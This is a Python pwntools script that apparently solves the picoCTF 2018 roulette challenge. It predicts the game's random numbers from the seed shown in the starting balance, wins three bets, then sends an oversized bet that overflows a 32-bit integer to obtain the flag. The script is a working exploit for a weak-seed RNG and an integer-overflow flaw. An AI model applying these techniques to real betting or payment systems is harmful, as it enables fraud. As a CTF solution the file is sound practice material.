#!/usr/bin/env python

import numpy as np
import pwn 
import re
import logging

DEBUG = 0
host, port = '2018shell.picoctf.com', 21444

logging.basicConfig(level=logging.CRITICAL)
pwn.context.log_level = 'Critical'

LONG_MAX    = 2147483647 
bet         = str(LONG_MAX+1000000000)  #bet = -1 billion  <= int32 overflow

#logging.debug(np.int32(LONG_MAX))
#logging.debug(np.int32(LONG_MAX+1))

l = 0
l = np.int32(l)
for c in bet:
    if l >= LONG_MAX:
        #print "Too Big {}".format(np.int32(l))
        break
    l = np.int32(l) * 10
    l = np.int32(l) + (ord(c)-ord('0'))
    #print np.int32(l)


def predict_roulette(seed):
    numbers = []
    s = pwn.process(['./predict_rand',str(seed)])
    i = 0
    num = 1
    try:
        while(num):
            num = s.recvline()
            i +=1
            if (i % 2):
                numbers.append(num.rstrip())
    except EOFError:
        return numbers
    return numbers


def get_flag(h, p):
    logging.debug('connecting process')
    if DEBUG:
        s = pwn.process('./roulette')
    else:
        s = pwn.remote(h, p)

    prompt = s.recvuntil('Current Wins')
    cash_seed = re.findall('Current Balance: $([0-9]*) ', prompt)[0]
    logging.debug('cashe_seed = {}'.format(cash_seed))
    winning_numbers = predict_roulette(cash_seed)
    logging.debug('winning numbers = {}'.format(' '.join(winning_numbers)))

    s.recvuntil('>')
    logging.info('First bet') 
    s.sendline('1')         #bet 1 dollar
    s.recvuntil('>')
    s.sendline(winning_numbers[0])  #play a winning number

    s.recvuntil('>')  
    logging.info('Second bet') 
    s.sendline('1')         #bet 1 dollar
    s.recvuntil('>')
    s.sendline(winning_numbers[1])  #play a winning number

    s.recvuntil('>')  
    logging.info('Third bet') 
    s.sendline('1')         #bet 1 dollar
    s.recvuntil('>')
    s.sendline(winning_numbers[2])  #play a winning number

    s.recvuntil('>')  
    logging.info('Last bet') 
    s.sendline(bet)         #bet 1 dollar
    s.recvuntil('>')
    if winning_numbers[3] != 1:
        s.sendline('1')  #You must play a loosing number to print the flag
    else:
        s.sendline('2')

    final_line = ''
    try:
        while(1):
            final_line = s.recvline()
            flag = final_line.rstrip()
    except EOFError:
        return flag
    return flag


#for num in predict_roulette(1111):
#    print num


print get_flag(host, port)
